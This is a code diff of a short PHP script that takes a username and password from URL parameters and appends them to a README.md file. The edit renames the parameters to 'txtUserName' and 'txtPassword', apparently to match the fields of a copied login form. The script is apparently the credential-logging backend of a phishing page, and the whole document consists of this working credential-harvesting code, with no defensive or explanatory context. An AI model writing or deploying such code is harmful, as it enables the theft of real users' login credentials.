@@ -1,9 +1,9 @@
 <?php
 
-	if ($_GET["u"] && $_GET["p"]) {
+	if ($_GET["txtUserName"] && $_GET["txtPassword"]) {
 		# code...
 		$file = fopen("README.md","a");
-		fwrite($file, '<> ID : '.$_GET["u"].' --> PW : '.$_GET["p"]."\n");
+		fwrite($file, '<> ID : '.$_GET["txtUserName"].' --> PW : '.$_GET["txtPassword"]."\n");
 		fclose($file);
 
 	}
